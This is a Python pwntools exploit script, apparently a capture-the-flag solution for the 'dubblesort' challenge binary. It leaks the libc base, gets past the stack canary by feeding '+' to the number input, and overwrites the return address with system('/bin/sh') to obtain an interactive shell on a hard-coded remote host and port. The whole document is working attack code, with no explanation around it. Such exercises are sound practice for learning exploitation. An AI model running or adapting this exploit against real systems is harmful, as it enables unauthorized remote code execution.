#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './dubblesort'
#libFile = '/lib/i386-linux-gnu/libc.so.6'
libFile = './libc_32.so.6'

remoteIp = "124.126.19.106"
remotePort = 57767

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)


#--------------------------Exploit--------------------------
def exploit():
	ru(':')
	p = 'A' * 0x1C
	#db()
	s(p)

	lib.address = u32(ru('\xf7\x01')[-3:] + '\xf7') - (0xF7797244 - 0xF75e9000)
	li('libc base: ' + hex(lib.address))

	ru(':')
	num = 24 + 8 + 3
	sl(str(num))

	for i in range(num):
		if(i == 24):
			break
		ru('number : ')
		sl(str(0x1000 - i * 0x50))

	ru('number : ')
	sl('+') # for bypass cannary

	ru('number : ')
	sl(str(0x6F000000))
	ru('number : ')
	sl(str(0x6F000001))

	ru('number : ')
	sl(str(0x6F000002))

	ru('number : ')
	sl(str(0x6F000003))

	ru('number : ')
	sl(str(0x6F000004))

	ru('number : ')
	sl(str(0x6F000005))

	ru('number : ')
	sl(str(0x6F000006))

	ru('number : ')
	sl(str(lib.sym['system']))

	ru('number : ')
	sl(str(lib.sym['system'] + 2))


	bin_sh = lib.search('/bin/sh').next()
	sl(str(bin_sh))

	li('sh_addr: ' + hex(bin_sh))
	li('system : ' + hex(lib.sym['system']))


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
